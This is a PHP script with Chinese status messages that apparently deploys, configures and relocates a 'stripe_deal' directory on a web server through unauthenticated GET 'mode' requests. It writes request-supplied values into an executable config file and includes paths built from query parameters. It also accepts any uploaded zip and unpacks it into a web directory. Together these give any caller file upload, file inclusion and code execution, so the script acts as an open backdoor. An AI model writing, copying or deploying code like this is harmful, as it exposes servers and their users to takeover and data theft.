<?php
define('LOCATION_DIRS_FS', str_replace('\\', '/', __DIR__) . '/');
$oldPath = LOCATION_DIRS_FS . "stripe_deal";

if ($_GET['mode'] == 1) {
    if (!is_dir($oldPath)) {
        exit(json_encode(['code' => 0, 'msg' => '运行目录有误']));
    }
    $payload = @file_get_contents('php://input');

    $config = json_decode($payload, true);
    $channel = $config['channel'];
    $response = [];
    $path = $oldPath . '/' . $channel . '/configuration.php';
    if (file_exists($path)) {
        include $path;
    }
    $fileContent = "<?php\n\$config = [\n";
    foreach ($config as $key => $value) {
        $fileContent .= "    '$key' => '" . addslashes($value) . "', \n";
    }
    $fileContent .= "];\n?>";
    file_put_contents(LOCATION_DIRS_FS . "/stripe_deal/config.php", $fileContent);
    $newPath = LOCATION_DIRS_FS . "{$config['dir']}";
    if (rename($oldPath, $newPath)) {
        exit(json_encode(['code' => 1, 'dir' => $config['dir'], 'path' => "/{$config['dir']}/config.php", 'data' => $response]));
    } else {
        exit(json_encode(['code' => 0, 'dir' => 'stripe_deal', 'path' => "/stripe_deal/config.php", 'data' => $response]));
    }
} elseif ($_GET['mode'] == 2) {
    $dir = $_GET['dir'];
    include "./{$dir}/config.php";
    exit(json_encode($config));
} elseif ($_GET['mode'] == 3) {
    try {
        if ($_FILES != null) {
            $dir = $_GET['dir'];
            $filename = $_FILES['zip']['name'];
            $tmpName = $_FILES['zip']['tmp_name'];
            $domain = $_GET['domain'];
            $runDir = LOCATION_DIRS_FS . "/{$dir}";
            if (!is_dir($runDir)) {
                if ($dir != 'deal'){
                    exit(json_encode(['code' => 0, 'msg' => '运行目录有误']));
                }else{
                    mkdir($runDir, 0777, true);
                }
            }
            if (move_uploaded_file($tmpName, LOCATION_DIRS_FS . $filename)) {
                if (unzip(LOCATION_DIRS_FS . $filename, $runDir)) {
                    unlink(LOCATION_DIRS_FS . $filename);
                    exit(json_encode(['code' => 1, 'msg' => '文件解压成功']));
                }
                exit(json_encode(['code' => 0, 'msg' => '文件解压失败']));
            } else {
                exit(json_encode(['code' => 0, 'msg' => '压缩包保存失败']));
            }
        }
        exit(json_encode(['code' => 0, 'msg' => '压缩包为空']));
    } catch (\Exception $e) {
        exit(json_encode(['code' => 0, 'msg' => $e->getMessage()]));
    }
}

function random_str($length = 10)
{
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, $length);
}

/**
 * @param string $filePath
 * @param string $path
 * @return bool
 */
function unzip($filePath, $path)
{
    if (!file_exists($filePath)) return false;
    if (!is_dir($path)) mkdir($path, 0777, true);
    $zip = new \ZipArchive();
    if ($zip->open($filePath) === true) {
        $zip->extractTo($path);
        $zip->close();
        return true;
    } else {
        return false;
    }
}

?>
